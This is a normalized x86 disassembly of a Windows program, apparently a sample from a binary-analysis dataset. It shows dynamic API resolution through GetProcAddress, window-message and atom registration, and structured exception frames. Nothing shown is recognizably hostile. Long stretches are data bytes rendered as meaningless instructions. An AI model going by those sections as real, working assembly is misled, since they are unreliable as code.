mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c784
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42c57c
xor eax eax
push ebp
push sub_42cb37
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb3e
mov eax [ rw-data ]
call sub_42c584
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42cee8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42cf10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf58
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf5f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_40321c
call sub_42c5c4
cmp [ rw-data ] 0x0
jg r-xdata
sub_42cf80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cfa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfac
retn
sub_42cfb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cfdd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfe4
retn
sub_42cff0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d015
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d01c
retn
sub_42d028
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d04d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d054
retn
sub_42d060
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d085
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d08c
retn
sub_42d098
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0c4
retn
sub_42d0d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0fc
retn
sub_42d108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d12d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d134
retn
sub_42d140
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d165
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d16c
retn
sub_42d17c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 ] al
inc edx
add [ edx + edx * 8 ] ah
inc edx
add [ eax ] bl
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ eax - 0x4bffbd2d ] cl
xor [ eax ] eax
shl [ ecx ] 0x1
inc eax
add [ ebx + edx * 8 ] ch
inc edx
add [ eax + ebp * 4 ] ah
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
sub_42d32c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
test bl bl
jle r-xdata
call sub_420c64
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42d360
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4609c4
mov cl 0x1
sub_42d388
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40346c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d3ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_457314
mov [ ebp - 0x14 ] eax
call sub_457230
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d51b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4602b4
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42d4ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d4f4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460310
retn
sub_42d4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d522
mov eax [ ebp - 0x14 ]
call sub_4573c8
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_457238
retn
sub_42d5f8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408ed8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d693
add [ edi ] cl
add [ eax ] al
add [ eax + edi * 8 + 0x64680046 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x100046f8 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x643c0046 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c0046f8 ] ah
push 0x47
add [ eax ] al
pushfd
clc
inc esi
add [ eax ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb908 ] bl
inc di
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x67c80046 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffb908 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x66d40046 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x140046f8 ] cl
inc di
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x68c00046 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x8 ] dl
inc esi
add [ esp + 0x47 ] bh
add [ eax ] al
dec esp
clc
inc esi
add [ eax + ebp * 2 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x8 ] cl
inc esi
add [ eax + 0x68 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + edi * 8 + 0x46 ] al
add [ esi + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42d79e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7a5
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a20
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42d7a8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d40
call sub_42d5f8
mov eax [ r-xdata ]
call sub_4199d8
mov eax [ r-xdata ]
call sub_419a78
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
sub_42d7e8
in al dx
xlat
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
js r-xdata
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
xlat
inc edx
add [ ecx ] cl
bound esi [ ebx + 0x4c ]
outsd
ja r-xdata
jo r-xdata
imul ebp [ esi + 0x65 ] 0x53736208
inc edx
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add al ah
cld
inc ebx
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
push esp
jmp r-xdata
xor [ eax ] eax
dec eax
add [ eax + eax - 0x68 ] 0x29
inc esp
add [ eax + 0x4000441d ] dl
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
or [ eax + eax + 0x24 ] eax
sbb eax [ eax + eax - 0x20 ]
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x65 ] 0x5273620b
inc eax
add [ eax - 0x7d ] cl
inc esp
add [ eax - 0x6fffbbd7 ] bl
sbb eax 0xa7400044
add [ ecx + esi + 0x31d00040 ] dh
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
dec esp
mov edx 0x740043
add bh bh
js r-xdata
insb
nop
js r-xdata
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
insb
jae r-xdata
js r-xdata
je r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
inc esp
add [ ecx ] al
sub eax [ eax + eax + 0x78 ]
or eax 0xdec0044
inc esp
add [ eax - 0x2 ] ah
inc ebx
add ah cl
or eax 0xed280044
inc edx
add [ esi ] al
push esp
inc edx
jbe r-xdata
add [ ebx + ebx ] ah
inc esp
add al ah
inc edx
add [ edi ] al
push es
push esp
inc edx
jbe r-xdata
je r-xdata
fadd [ edx ]
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ ebx + ebp * 8 + 0x42 ] dl
add [ eax ] ch
sbb [ eax + eax + 0x24 ] al
sbb [ eax + eax - 0xc ] al
sbb [ eax + eax - 0x18 ] al
sti
inc ebx
add [ ebx + eax ] ch
inc esp
add [ eax - 0x47ffbbfe ] dl
or eax [ eax + eax + 0x30 ]
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
inc esp
inc eax
add [ eax - 0x4bffbbe4 ] bh
xor [ eax ] eax
shl [ ecx ] 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27 ] bh
insb
jae r-xdata
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
les eax [ edi ]
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
clc
fiadd [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
inc edx
add [ eax + 0x1 ] ch
add bh bh
shr bl 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
fcomp st0
inc edx
add [ eax - 0x32 ] al
inc ebx
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
add [ ebx + 0x33 ] esi
mov eax r-xdata
call sub_403d40
call sub_42d5f8
mov eax [ r-xdata ]
call sub_4199d8
mov eax [ r-xdata ]
call sub_419a78
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
retn
shr [ eax ] 0xd8
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
jmp r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + 0x18ff0000 ] bl
or al [ eax + eax + 0x1 ]
add [ eax ] al
[ eax ]
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + ebx * 8 ] ah
inc edx
add [ 0x6f427362 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xdb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
fild [ edx ]
xor bl bl
inc edx
add [ eax + eax ] al
add [ eax - 0x76 ] ch
inc ecx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] al
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
fadd [ edx ]
imul eax [ ecx ] 0xebdcff00
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0xb010000 ] bl
add [ eax ] al
add [ eax ] 0x0
mov esp 0x4409
xlat
add [ eax ] al
add [ eax ] al
add bh bh
sbb [ edx ] cl
inc esp
add [ ecx ] al
insb
jae r-xdata
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
add [ edx + esi * 4 + 0x43 ] bh
add [ ebx ] bl
add bh bh
mov eax 0x10043fd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
movsb [ edi ] [ esi ]
mov ecx 0x610043
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ ecx + ebx * 8 + 0x42 ] ch
add [ ecx + eax ] ch
add [ ebp + ecx * 8 + 0x43 ] cl
push esp
outsd
jo r-xdata
insd
or [ gs : edx + 0x73 ] esp
cdq
sub_42daf6
inc edx
add [ eax + ebp * 4 ] ah
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_42e940
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
outsb
je r-xdata
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
pop ebx
mov esp ebp
pop ebp
retn
jpe r-xdata
add [ edi ] al
outsd
insb
outsd
jb r-xdata
inc ebx
or al 0x89
inc ebp
hlt
mov al 0x78
inc ecx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
sbb [ esi ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
dec ebp
imul ebp [ esi + 0x53 ] 0x657a69
adc [ eax ] al
pop edx
add [ eax ] al
[ eax + 0xa ]
out 0x42 al
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
or edx [ edx + 0x65 ]
jae r-xdata
hlt
mov al 0x78
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b55c08b
in al dx
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
push edx
jae r-xdata
jpe r-xdata
popad
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
jmp [ eax ]
insb
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
les eax [ edi ]
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
sub_42e9ae
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
popad
outsb
push edx
jae r-xdata
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
